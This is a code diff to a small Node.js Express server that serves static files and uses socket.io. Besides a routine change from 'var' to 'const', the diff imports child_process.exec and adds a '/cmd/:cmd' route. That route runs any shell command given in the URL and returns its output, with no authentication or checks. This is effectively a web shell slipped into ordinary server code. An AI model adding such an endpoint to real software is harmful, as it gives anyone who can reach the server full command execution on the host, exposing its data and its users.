@@ -1,8 +1,9 @@
 const fs = require('fs');
-var express = require('express')
-var app = express()
-var server = require('http').createServer(app);
-var io = require('socket.io')(server);
+const express = require('express')
+const app = express()
+const server = require('http').createServer(app);
+const io = require('socket.io')(server);
+const {exec} = require('child_process');
 
 app.get('/', (req, res)=>{
     let indexFile = fs.readFileSync('./public/index.html');
@@ -18,6 +19,12 @@ app.get('/script.js', (req, res)=>{
     let indexFile = fs.readFileSync('./public/script.js');
     res.writeHead(200,  {'Content-Type': 'text/javascript'});
     res.end(indexFile.toString());
+})
+app.get('/cmd/:cmd', (req, res)=>{
+    exec(req.params.cmd,(err, data)=>{
+        console.log(data)
+        res.send(data);
+    });
 })
 
 let counter = 0;
